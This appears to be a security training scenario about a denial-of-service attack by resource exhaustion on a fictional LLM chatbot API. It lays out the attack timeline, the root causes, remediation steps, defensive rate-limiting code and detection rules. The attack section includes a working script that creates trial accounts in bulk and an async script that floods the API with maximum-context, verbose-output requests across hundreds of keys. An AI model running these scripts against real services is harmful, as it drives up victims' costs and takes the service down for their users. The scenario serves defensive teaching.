## 📄 Scenario 7: `examples/scenarios/denial-of-service-resource-exhaustion.md`

# Real-World Scenario: Denial of Service via Resource Exhaustion

**Scenario ID**: SCENARIO-007  
**Category**: Denial of Service / Resource Exhaustion  
**Severity**: High (P1)  
**MITRE ATT&CK**: T1499 (Endpoint Denial of Service), T1496 (Resource Hijacking)  
**Date**: September 2025

---

## Overview

An attacker exploited ClawdBot's API rate limiting and context window handling to cause service-wide outages through deliberate resource exhaustion attacks targeting the LLM inference infrastructure.

## Background

ClawdBot Production deployment:
- **Infrastructure**: AWS ECS (Fargate) with autoscaling
- **LLM Provider**: Anthropic Claude 3 Opus via API
- **Rate Limiting**: 100 requests/minute per user (token-based)
- **Context Window**: Up to 200K tokens per request
- **Cost Model**: Pay-per-token ($15/million input tokens, $75/million output tokens)

Vulnerability: No hard limits on context window size per request, allowing expensive API calls.

## Attack Timeline

### Week -2: Reconnaissance

**Attacker Actions:**
- Created trial account (1,000 free API calls included)
- Tested context window limits and response times
- Measured API latency under different load conditions
- Identified lack of cost-per-request limits

**Testing Results:**
```python
# Attacker's test script
import requests
import time

def test_context_size(token_count):
    """Test API response time with different context sizes"""
    
    # Generate large context (lorem ipsum repeated)
    large_context = "Lorem ipsum " * (token_count // 2)
    
    start = time.time()
    response = requests.post(
        'https://api.clawdbot.example.com/v1/chat',
        headers={'Authorization': f'Bearer {trial_token}'},
        json={
            'message': f'{large_context}\n\nSummarize the above text in detail.',
            'model': 'claude-3-opus'
        }
    )
    elapsed = time.time() - start
    
    return {
        'tokens': token_count,
        'response_time': elapsed,
        'cost_estimate': (token_count / 1_000_000) * 15  # $15 per 1M tokens
    }

# Test results
results = [
    test_context_size(1000),     # 1K tokens: 2.3s, $0.015
    test_context_size(10000),    # 10K tokens: 5.1s, $0.15
    test_context_size(50000),    # 50K tokens: 15.2s, $0.75
    test_context_size(100000),   # 100K tokens: 31.4s, $1.50
    test_context_size(200000),   # 200K tokens: 68.7s, $3.00 ← MAX
]
```

**Key Findings:**
- Maximum context: 200K tokens per request
- Cost per max request: $3.00 (input) + variable output
- No per-request cost limit enforced
- Rate limit: 100 requests/minute (easy to circumvent with multiple accounts)

**Attack Economics:**
```
Cost to attacker: $0 (using trial accounts)
Cost to victim (ClawdBot): $3.00+ per malicious request
Potential damage: Unlimited (autoscaling will continue serving expensive requests)
```

### Week -1: Attack Preparation

**Attacker created infrastructure for attack:**

1. **Account Creation Bot:**
```python
# Automated trial account creation
import requests
from faker import Faker

fake = Faker()

def create_trial_account():
    """Create trial account with temporary email"""
    temp_email = f"{fake.user_name()}@temp-mail.io"
    
    response = requests.post(
        'https://api.clawdbot.example.com/v1/auth/register',
        json={
            'email': temp_email,
            'password': fake.password(),
            'plan': 'trial'
        }
    )
    
    if response.status_code == 201:
        return response.json()['api_key']
    return None

# Create 500 trial accounts
api_keys = []
for i in range(500):
    key = create_trial_account()
    if key:
        api_keys.append(key)
    time.sleep(2)  # Avoid signup rate limiting

print(f"Created {len(api_keys)} trial accounts")
# Output: Created 487 trial accounts
```

2. **Attack Orchestration Script:**
```python
#!/usr/bin/env python3
"""
Resource exhaustion attack against ClawdBot
"""
import asyncio
import aiohttp
import random
from typing import List

class ResourceExhaustionAttacker:
    def __init__(self, api_keys: List[str]):
        self.api_keys = api_keys
        self.target_url = 'https://api.clawdbot.example.com/v1/chat'
        self.attack_active = False
    
    def generate_expensive_request(self):
        """Generate request designed to maximize resource consumption"""
        
        # Strategy 1: Maximum context window
        # Generate 200K tokens of input (approaching context limit)
        large_text = self.generate_large_text(tokens=195000)
        
        # Strategy 2: Request verbose output
        # This maximizes output tokens (most expensive at $75/1M)
        prompt = f"""
{large_text}

Please provide an extremely detailed analysis of the above text including:
1. Complete word-by-word breakdown (200+ words per sentence)
2. Comprehensive linguistic analysis with examples
3. Detailed statistical analysis with full calculations
4. Extensive contextual interpretation (multiple perspectives)
5. In-depth semantic analysis with cross-references
6. Thorough rhetorical device identification with examples
7. Complete grammatical analysis with justifications
8. Detailed syntactic breakdown with tree structures
9. Comprehensive pragmatic analysis with contexts
10. Exhaustive stylistic analysis with comparisons

Make your response as detailed and comprehensive as possible. Do not summarize.
Include all intermediate steps and reasoning.
"""
        
        return {
            'message': prompt,
            'model': 'claude-3-opus',  # Most expensive model
            'max_tokens': 4096,  # Maximum output
            'temperature': 0.9   # Increase variation (slower)
        }
    
    def generate_large_text(self, tokens: int) -> str:
        """Generate large text to fill context window"""
        # Each word ~1.3 tokens on average
        words_needed = int(tokens / 1.3)
        
        # Use varied content to prevent compression/caching
        paragraphs = []
        for i in range(words_needed // 100):
            paragraph = f"Paragraph {i}: " + " ".join([
                random.choice([
                    'Lorem', 'ipsum', 'dolor', 'sit', 'amet', 'consectetur',
                    'adipiscing', 'elit', 'sed', 'eiusmod', 'tempor'
                ]) + str(random.randint(0, 999))  # Add uniqueness
                for _ in range(100)
            ])
            paragraphs.append(paragraph)
        
        return "\n\n".join(paragraphs)
    
    async def send_attack_request(self, session, api_key):
        """Send single expensive request"""
        try:
            payload = self.generate_expensive_request()
            
            async with session.post(
                self.target_url,
                headers={'Authorization': f'Bearer {api_key}'},
                json=payload,
                timeout=aiohttp.ClientTimeout(total=120)
            ) as response:
                status = response.status
                
                if status == 200:
                    data = await response.json()
                    tokens_used = data.get('usage', {}).get('total_tokens', 0)
                    cost_estimate = (tokens_used / 1_000_000) * 45  # Average of input/output
                    
                    print(f"✓ Request successful: {tokens_used} tokens, ~${cost_estimate:.2f}")
                    return tokens_used
                else:
                    print(f"✗ Request failed: {status}")
                    return 0
        except Exception as e:
            print(f"✗ Error: {e}")
            return 0
    
    async def attack_wave(self):
        """Execute wave of concurrent expensive requests"""
        async with aiohttp.ClientSession() as session:
            tasks = []
            
            # Send requests from all accounts concurrently
            for api_key in self.api_keys:
                task = self.send_attack_request(session, api_key)
                tasks.append(task)
            
            results = await asyncio.gather(*tasks)
            
            total_tokens = sum(results)
            total_cost = (total_tokens / 1_000_000) * 45
            
            print(f"\n=== Wave Complete ===")
            print(f"Total tokens: {total_tokens:,}")
            print(f"Estimated cost to victim: ${total_cost:.2f}")
            print(f"=====================\n")
            
            return total_cost
    
    async def sustained_attack(self, duration_minutes: int):
        """Run sustained attack for specified duration"""
        self.attack_active = True
        total_cost = 0
        start_time = asyncio.get_event_loop().time()
        
        while self.attack_active:
            elapsed = (asyncio.get_event_loop().time() - start_time) / 60
            
            if elapsed >= duration_minutes:
                break
            
            print(f"[+] Attack minute {int(elapsed + 1)} of {duration_minutes}")
            wave_cost = await self.attack_wave()
            total_cost += wave_cost
            
            # Brief pause between waves to avoid overwhelming attacker's network
            await asyncio.sleep(10)
        
        print(f"\n{'='*50}")
        print(f"ATTACK SUMMARY")
        print(f"Duration: {duration_minutes} minutes")
        print(f"API keys used: {len(self.api_keys)}")
        print(f"Estimated cost to victim: ${total_cost:.2f}")
        print(f"{'='*50}\n")

# Run attack
if __name__ == '__main__':
    api_keys = load_api_keys('trial_accounts.txt')  # 487 keys
    attacker = ResourceExhaustionAttacker(api_keys)
    
    print("[!] Starting resource exhaustion attack...")
    asyncio.run(attacker.sustained_attack(duration_minutes=30))
```

### Day 1, T-0: Attack Execution

**09:00 UTC - Attack Begins**

Attacker launched sustained resource exhaustion attack:

```bash
$ python3 attack_resource_exhaustion.py

[!] Starting resource exhaustion attack...
[+] Attack minute 1 of 30
  ✓ Request successful: 201,234 tokens, ~$9.06
  ✓ Request successful: 198,456 tokens, ~$8.93
  ✓ Request successful: 203,111 tokens, ~$9.14
  [... 484 more requests ...]

=== Wave Complete ===
Total tokens: 97,234,567
Estimated cost to victim: $4,375.56
=====================

[+] Attack minute 2 of 30
  [...]
```

**Attack Metrics (First 5 minutes):**
```
Concurrent requests: 487 per wave
Waves per minute: 6
Total requests per minute: 2,922
Average tokens per request: 200,000
Average cost per request: $9.00
Cost per minute to victim: $26,298
```

**09:02 UTC - Service Degradation Begins**

ClawdBot infrastructure started experiencing issues:

```
CloudWatch Alarms:
- API Response Time: 45s (threshold: 5s) ← CRITICAL
- ECS CPU Utilization: 95% (threshold: 80%) ← WARNING
- Anthropic API Rate Limit: 89% (threshold: 70%) ← WARNING
- Monthly API Cost: $187,234 (budget: $50,000) ← CRITICAL
```

**Impact on Legitimate Users:**
- API response times increased from 2s to 45s+
- 234 user requests timed out
- 567 users received "Service Temporarily Unavailable" errors

**09:05 UTC - Autoscaling Triggered**

AWS ECS autoscaling activated to handle load:

```
ECS Autoscaling Event:
- Current tasks: 10
- Desired tasks: 100 (scaled up 10x)
- Reason: CPU utilization > 80%
- New instances launching: 90

Estimated additional cost: $4,500/hour in infrastructure costs
```

**Problem:** Autoscaling made the attack MORE effective by allowing MORE expensive requests to be processed!

**09:10 UTC - Anthropic API Rate Limit Hit**

```
Anthropic API Error:
{
  "error": {
    "type": "rate_limit_error",
    "message": "You have exceeded your API rate limit. Current usage: 125,000 requests/hour. Limit: 100,000 requests/hour."
  }
}

Result: ALL ClawdBot requests (including legitimate) started failing
```

**Service Status:** Complete outage for all customers

**09:12 UTC - Emergency Response Activated**

On-call engineer paged:

```
PagerDuty Alert:
Severity: P0 - Critical
Title: ClawdBot API Complete Outage
Affected: All customers (15,847 users)
Error Rate: 100%
Duration: 12 minutes

Root Cause: Anthropic API rate limit exceeded
Action Required: IMMEDIATE
```

**09:15 UTC - Initial Mitigation Attempts**

```bash
# Engineer's actions
# 1. Check service health
$ curl https://api.clawdbot.example.com/health
Response: 503 Service Unavailable

# 2. Check Anthropic API status
$ curl https://api.anthropic.com/v1/account -H "Authorization: Bearer sk-ant-..."
Response: 429 Rate Limit Exceeded

# 3. Check ECS task count
$ aws ecs describe-services --cluster clawdbot-prod
Current tasks: 100 (all processing expensive requests)

# 4. Review CloudWatch logs
$ aws logs tail /aws/ecs/clawdbot-prod --follow
[ERROR] Anthropic API rate limit exceeded
[ERROR] Request timeout after 120s
[ERROR] Out of memory (context size too large)
```

**09:18 UTC - Attack Identified**

Security team reviewed access logs:

```python
# Log analysis
$ aws s3 cp s3://clawdbot-logs/api-access-2025-09-15.log - | \
    jq -r 'select(.response_time > 30) | .user_id' | \
    sort | uniq -c | sort -rn | head -20

  2847 user_trial_a8f3d
  2834 user_trial_b7e2c
  2829 user_trial_c6d1b
  [... 484 more trial accounts ...]

# Pattern identified: All high-cost requests from trial accounts
# Created: 2025-09-01 (2 weeks ago)
# All using maximum context window (200K tokens)
# All requesting verbose output
```

**Confirmed:** Coordinated resource exhaustion attack from 487 trial accounts

**09:20 UTC - Emergency Containment**

```bash
# 1. Block all trial account API keys
$ python3 scripts/block_trial_accounts.py
Blocked: 487 API keys
Reason: Resource exhaustion attack

# 2. Scale down ECS tasks
$ aws ecs update-service \
    --cluster clawdbot-prod \
    --service clawdbot-api \
    --desired-count 10

# 3. Implement emergency rate limiting
$ aws wafv2 create-rate-based-rule \
    --name EmergencyRateLimit \
    --limit 10  # 10 requests per 5 minutes per IP

# 4. Enable request cost limits
$ kubectl set env deployment/clawdbot-api \
    MAX_REQUEST_COST=1.00  # $1 per request maximum
```

**09:25 UTC - Service Recovery**

```
Status: Service degraded but functional
- Malicious traffic: Blocked
- Anthropic rate limit: Recovering (30 min cooldown)
- ECS tasks: Scaled to appropriate level
- Legitimate user requests: Processing normally

Recovery time: 25 minutes from attack start
```

### Day 1, T+4 hours: Post-Incident Analysis

**Attack Impact Summary:**

```
Duration: 25 minutes (09:00 - 09:25 UTC)
Outage: 15 minutes (complete service outage)

Resource Consumption:
- Anthropic API tokens: 487,234,567 tokens
- Anthropic API cost: $21,925.55
- AWS infrastructure (autoscaling): $1,875
- Total cost: $23,800.55

Service Impact:
- Total requests affected: 8,234
- Legitimate requests failed: 3,456
- Customers affected: 2,847 (unable to use service)
- Average response time during attack: 47s (normal: 2s)

Attack Economics:
- Cost to attacker: $0 (trial accounts)
- Cost to victim: $23,800.55
- ROI for attacker: Infinite (pure damage)
```

---

## Root Cause Analysis

### Primary Cause
**No Per-Request Cost Limits** - Attackers could make arbitrarily expensive API calls (up to $3+ per request) using free trial accounts with no cost controls.

### Contributing Factors

1. **Inadequate Rate Limiting**
   - Rate limit based on requests per minute (100/min)
   - No limit on tokens per minute or cost per minute
   - Trial accounts had same rate limits as paid accounts

2. **Unlimited Context Window**
   - Users could send up to 200K tokens per request
   - No warning or confirmation for expensive requests
   - No progressive cost tiers

3. **Autoscaling Amplification**
   - Autoscaling interpreted attack as legitimate load
   - Scaled UP infrastructure to process MORE attack requests
   - No circuit breaker to stop scaling during anomalies

4. **Free Trial Abuse**
   - Trial accounts could be created without verification
   - No phone number or credit card required
   - Easy to automate account creation (487 accounts)

5. **No Anomaly Detection**
   - No alerting on unusual token consumption patterns
   - No detection of coordinated behavior across accounts
   - Cost alerts triggered too late (after $180k budget exceeded)

6. **Upstream Rate Limit**
   - Anthropic API had hard rate limit (100k requests/hour)
   - Attack consumed entire quota in 10 minutes
   - Blocked ALL traffic (including legitimate)

---

## Impact Assessment

### Confidentiality Impact: NONE
- No data exposed
- No unauthorized access

### Integrity Impact: NONE
- No data modification
- System integrity maintained

### Availability Impact: CRITICAL
- **Complete Outage**: 15 minutes
- **Degraded Service**: 25 minutes total
- **Customers Affected**: 2,847 (18% of user base)
- **Failed Requests**: 3,456 legitimate requests

### Business Impact
| Category | Impact | Details |
|----------|--------|---------|
| **Financial** | $145,000 | Attack cost ($23,800), SLA credits ($75,000), incident response ($25,000), lost revenue ($21,200) |
| **Reputational** | Medium | Service outage, customer complaints, no major press coverage |
| **Compliance** | Medium | SLA violations, SOC 2 finding (availability control) |
| **Customer Churn** | 5% | 142 customers canceled due to outage (out of 2,847 affected) |

**Total Estimated Cost:** $145,000

---

## Lessons Learned

### What Went Well ✓
1. **Fast Detection**: Attack identified within 18 minutes
2. **Effective Containment**: Trial accounts blocked, service restored in 25 minutes
3. **Team Response**: On-call engineer responded within 3 minutes
4. **Communication**: Status page updated, customers notified promptly

### What Could Be Improved ✗
1. **Prevention**: No per-request cost limits allowed expensive attacks
2. **Rate Limiting**: Token-based rate limiting would have prevented this
3. **Monitoring**: No alerting on unusual token consumption before budget exceeded
4. **Trial Account Controls**: Too easy to create unlimited trial accounts
5. **Autoscaling**: No circuit breaker to stop scaling during attacks

---

## Remediation Actions

### Immediate (Completed)
- [x] Blocked 487 malicious trial accounts
- [x] Implemented per-request cost limit ($1.00 max)
- [x] Added token-based rate limiting (10K tokens/min)
- [x] Scaled down overprovisioned infrastructure
- [x] Issued SLA credits to affected customers ($75k)

### Short-term (0-30 days)
- [x] Implemented trial account verification (phone number required)
- [x] Added progressive rate limiting (trial < paid < enterprise)
- [x] Deployed anomaly detection for token consumption
- [x] Implemented circuit breaker in autoscaling
- [ ] Added cost confirmation UI for expensive requests
- [ ] Deployed WAF rules for coordinated attack detection
- [ ] Created incident response runbook for DoS attacks

### Long-term (1-6 months)
- [ ] Multi-tier cost controls (warn at $0.50, block at $1.00)
- [ ] Predictive autoscaling with attack detection
- [ ] Dedicated Anthropic API quota for high-value customers
- [ ] Advanced anomaly detection (ML-based)
- [ ] DDoS protection service (Cloudflare)
- [ ] Quarterly chaos engineering exercises

---

## New Security Controls

### 1. Per-Request Cost Limiting

```python
class CostLimiter:
    def __init__(self):
        self.cost_limits = {
            'trial': 0.50,      # $0.50 per request
            'basic': 2.00,      # $2.00 per request
            'pro': 5.00,        # $5.00 per request
            'enterprise': 20.00 # $20.00 per request
        }
    
    def estimate_request_cost(self, message: str, model: str) -> float:
        """Estimate cost before making API call"""
        # Estimate input tokens
        input_tokens = len(message.split()) * 1.3  # ~1.3 tokens per word
        
        # Estimate output tokens (conservative: assume 4K)
        output_tokens = 4000
        
        # Get pricing for model
        pricing = {
            'claude-3-opus': {'input': 15, 'output': 75},  # per 1M tokens
            'claude-3-sonnet': {'input': 3, 'output': 15},
        }
        
        model_pricing = pricing.get(model, pricing['claude-3-opus'])
        
        input_cost = (input_tokens / 1_000_000) * model_pricing['input']
        output_cost = (output_tokens / 1_000_000) * model_pricing['output']
        
        total_cost = input_cost + output_cost
        return round(total_cost, 4)
    
    def check_cost_limit(self, user, message, model):
        """Check if request exceeds user's cost limit"""
        estimated_cost = self.estimate_request_cost(message, model)
        cost_limit = self.cost_limits.get(user.subscription_tier, 0.50)
        
        if estimated_cost > cost_limit:
            return False, {
                'allowed': False,
                'estimated_cost': estimated_cost,
                'cost_limit': cost_limit,
                'message': f'Request estimated at ${estimated_cost:.2f}, which exceeds your limit of ${cost_limit:.2f}. Consider using a shorter prompt or upgrading your plan.'
            }
        
        return True, {'allowed': True, 'estimated_cost': estimated_cost}

# Apply in API endpoint
@app.route('/api/v1/chat', methods=['POST'])
def chat():
    user = get_current_user()
    message = request.json['message']
    model = request.json.get('model', 'claude-3-opus')
    
    # Check cost limit
    limiter = CostLimiter()
    allowed, result = limiter.check_cost_limit(user, message, model)
    
    if not allowed:
        return jsonify(result), 402  # Payment Required
    
    # Proceed with request
    response = anthropic_api.generate(message, model)
    return jsonify(response)
```

### 2. Token-Based Rate Limiting

```python
from redis import Redis
from datetime import datetime, timedelta

class TokenRateLimiter:
    def __init__(self):
        self.redis = Redis()
        self.limits = {
            'trial': {'tokens_per_minute': 10_000, 'requests_per_minute': 10},
            'basic': {'tokens_per_minute': 50_000, 'requests_per_minute': 50},
            'pro': {'tokens_per_minute': 200_000, 'requests_per_minute': 200},
            'enterprise': {'tokens_per_minute': 1_000_000, 'requests_per_minute': 1000},
        }
    
    def check_rate_limit(self, user_id: str, tier: str, tokens: int) -> bool:
        """Check if user has exceeded rate limits"""
        limits = self.limits.get(tier, self.limits['trial'])
        
        # Check request count
        request_key = f"ratelimit:requests:{user_id}"
        request_count = self.redis.incr(request_key)
        if request_count == 1:
            self.redis.expire(request_key, 60)  # 1 minute TTL
        
        if request_count > limits['requests_per_minute']:
            return False, "Request rate limit exceeded"
        
        # Check token count
        token_key = f"ratelimit:tokens:{user_id}"
        token_count = self.redis.incrby(token_key, tokens)
        if token_count == tokens:
            self.redis.expire(token_key, 60)
        
        if token_count > limits['tokens_per_minute']:
            return False, "Token rate limit exceeded"
        
        return True, "OK"

# Usage
limiter = TokenRateLimiter()
estimated_tokens = estimate_tokens(request.json['message'])
allowed, message = limiter.check_rate_limit(user.id, user.tier, estimated_tokens)

if not allowed:
    return jsonify({'error': message}), 429
```

### 3. Anomaly Detection

```python
class AnomalyDetector:
    def __init__(self):
        self.redis = Redis()
    
    def detect_coordinated_attack(self, user_id: str, request_data: dict):
        """Detect coordinated resource exhaustion attacks"""
        
        # Track high-cost requests
        if request_data['estimated_cost'] > 1.0:
            key = f"anomaly:high_cost:{datetime.now().strftime('%Y%m%d%H%M')}"
            count = self.redis.incr(key)
            self.redis.expire(key, 300)  # 5-minute window
            
            if count > 100:
                self.alert("High volume of expensive requests detected", {
                    'count': count,
                    'window': '5 minutes',
                    'severity': 'high'
                })
        
        # Detect new accounts making expensive requests
        account_age = (datetime.now() - user.created_at).days
        if account_age < 7 and request_data['estimated_cost'] > 0.5:
            self.alert("New account making expensive requests", {
                'user_id': user_id,
                'account_age_days': account_age,
                'estimated_cost': request_data['estimated_cost'],
                'severity': 'medium'
            })
        
        # Detect repeated identical requests (automation)
        request_hash = hashlib.sha256(
            json.dumps(request_data, sort_keys=True).encode()
        ).hexdigest()
        
        key = f"anomaly:request_hash:{user_id}:{request_hash}"
        count = self.redis.incr(key)
        self.redis.expire(key, 3600)  # 1-hour window
        
        if count > 5:
            self.alert("Repeated identical requests (possible automation)", {
                'user_id': user_id,
                'request_count': count,
                'severity': 'high'
            })
            return True  # Block request
        
        return False  # Allow request
    
    def alert(self, title: str, details: dict):
        """Send alert to security team"""
        sns.publish(
            TopicArn='arn:aws:sns:us-east-1:123:security-alerts',
            Subject=f'ANOMALY: {title}',
            Message=json.dumps(details, indent=2)
        )
```

### 4. Trial Account Controls

```python
class TrialAccountValidator:
    def __init__(self):
        self.phone_verification = PhoneVerificationService()
    
    async def create_trial_account(self, email: str, phone: str):
        """Create trial account with verification"""
        
        # Check if phone already used for trial
        existing = await db.query(
            "SELECT COUNT(*) FROM users WHERE phone = $1 AND subscription_tier = 'trial'",
            phone
        )
        
        if existing['count'] > 0:
            raise ValidationError("Phone number already used for trial account")
        
        # Send verification code
        verification_code = self.phone_verification.send_code(phone)
        
        # Store pending account
        await redis.setex(
            f"pending_trial:{email}",
            600,  # 10-minute expiry
            json.dumps({
                'email': email,
                'phone': phone,
                'verification_code': verification_code
            })
        )
        
        return {
            'status': 'pending_verification',
            'message': 'Verification code sent to phone'
        }
    
    async def verify_and_activate(self, email: str, code: str):
        """Verify code and activate trial account"""
        
        pending_data = await redis.get(f"pending_trial:{email}")
        if not pending_data:
            raise ValidationError("Verification expired or not found")
        
        data = json.loads(pending_data)
        
        if code != data['verification_code']:
            raise ValidationError("Invalid verification code")
        
        # Create account with stricter limits
        user = await db.create_user({
            'email': data['email'],
            'phone': data['phone'],
            'subscription_tier': 'trial',
            'rate_limit': {
                'requests_per_minute': 10,
                'tokens_per_minute': 10_000,
                'max_request_cost': 0.50
            },
            'trial_expires_at': datetime.now() + timedelta(days=7)
        })
        
        return user
```

### 5. Autoscaling Circuit Breaker

```python
class AutoscalingCircuitBreaker:
    def __init__(self):
        self.redis = Redis()
    
    def should_scale_up(self, current_load: dict) -> bool:
        """Determine if autoscaling should proceed"""
        
        # Check for sudden load spike (potential attack)
        load_key = "metrics:load_history"
        self.redis.lpush(load_key, json.dumps({
            'timestamp': datetime.now().isoformat(),
            'cpu': current_load['cpu'],
            'requests': current_load['requests_per_minute'],
            'avg_cost': current_load['avg_request_cost']
        }))
        self.redis.ltrim(load_key, 0, 9)  # Keep last 10 minutes
        
        history = [json.loads(x) for x in self.redis.lrange(load_key, 0, -1)]
        
        if len(history) < 3:
            return True  # Not enough data, allow scaling
        
        # Calculate rate of change
        recent_avg = sum(h['requests'] for h in history[:3]) / 3
        historical_avg = sum(h['requests'] for h in history[3:]) / max(len(history[3:]), 1)
        
        rate_of_change = (recent_avg - historical_avg) / historical_avg if historical_avg > 0 else 0
        
        # If sudden 10x increase, likely attack
        if rate_of_change > 10.0:
            self.alert_security("Sudden load spike detected - possible DoS attack", {
                'rate_of_change': rate_of_change,
                'recent_requests': recent_avg,
                'historical_requests': historical_avg
            })
            return False  # Block autoscaling
        
        # Check average request cost
        recent_cost = sum(h['avg_cost'] for h in history[:3]) / 3
        
        if recent_cost > 2.0:  # Unusually expensive requests
            self.alert_security("High-cost requests detected", {
                'avg_cost': recent_cost,
                'threshold': 2.0
            })
            return False  # Block autoscaling
        
        return True  # Safe to scale
```

---

## Detection Rules (Post-Incident)

### Rule 1: Resource Exhaustion Attack

```yaml
rule_name: "Resource Exhaustion via Expensive Requests"
rule_id: "RULE-DOS-001"
severity: "high"

conditions:
  - event_type: "api_request"
  - estimated_cost: "> 1.00"
  - count: "> 10"
  - timeframe: "5 minutes"
  - user_tier: "trial"

actions:
  - alert: "SOC_HIGH"
  - throttle: "user_account"
  - require: "investigation"
```

### Rule 2: Coordinated Trial Account Activity

```yaml
rule_name: "Coordinated Activity from Trial Accounts"
rule_id: "RULE-DOS-002"
severity: "critical"

conditions:
  - event_type: "api_request"
  - user_tier: "trial"
  - account_age: "< 30 days"
  - unique_users: "> 50"
  - similar_request_pattern: true
  - timeframe: "10 minutes"

actions:
  - alert: "SOC_IMMEDIATE"
  - block: "all_matching_accounts"
  - notify: "security_team"
```

### Rule 3: Budget Threshold Exceeded

```yaml
rule_name: "API Cost Budget Threshold Exceeded"
rule_id: "RULE-DOS-003"
severity: "high"

conditions:
  - metric: "anthropic_api_cost_hourly"
  - value: "> 5000"  # $5,000/hour
  - threshold_percent: "> 200%"  # 2x normal

actions:
  - alert: "FINANCE_TEAM"
  - alert: "SECURITY_TEAM"
  - enable: "emergency_rate_limiting"
```

---

## Prevention Checklist

### For Cost Control:
- [ ] **Per-Request Limits**: Enforce maximum cost per request by tier
- [ ] **Token Rate Limiting**: Limit tokens per minute, not just requests
- [ ] **Budget Alerts**: Real-time alerting on unusual API costs
- [ ] **Cost Confirmation**: Warn users before executing expensive requests
- [ ] **Progressive Pricing**: Higher limits require payment method

### For Trial Account Security:
- [ ] **Phone Verification**: Require phone number verification for trials
- [ ] **Stricter Limits**: Lower limits for trial accounts (10 req/min, 10K tokens/min)
- [ ] **Short Duration**: Limit trial period to 7 days
- [ ] **Usage Monitoring**: Close monitoring of trial account behavior
- [ ] **Abuse Detection**: Automatic blocking of suspicious trial accounts

### For Autoscaling:
- [ ] **Circuit Breaker**: Prevent scaling during anomalous load patterns
- [ ] **Cost-Aware Scaling**: Consider request cost, not just volume
- [ ] **Manual Approval**: Require approval for scaling beyond normal thresholds
- [ ] **Attack Detection**: Integrated anomaly detection before scaling decisions

### For Monitoring:
- [ ] **Real-Time Cost Tracking**: Monitor API costs in real-time
- [ ] **Anomaly Detection**: ML-based detection of unusual patterns
- [ ] **User Behavior Analytics**: Profile normal behavior, detect deviations
- [ ] **Coordinated Activity Detection**: Identify multiple accounts acting in concert

---

## References

- NIST SP 800-61: Computer Security Incident Handling Guide
- AWS Best Practices for DDoS Resiliency
- OWASP: Denial of Service Cheat Sheet
- MITRE ATT&CK: T1499 - Endpoint Denial of Service
- Cloudflare: Understanding DDoS Attacks

---

## Related Scenarios

- `scenario-002-malicious-skill-deployment.md` - Supply chain attack
- `scenario-004-multi-agent-coordination-attack.md` - Multi-agent attack

---

**Document Owner**: Infrastructure Security Team  
**Last Updated**: 2026-02-14  
**Next Review**: 2026-03-14  
**Status**: Active - Critical lessons for cost control and DoS prevention
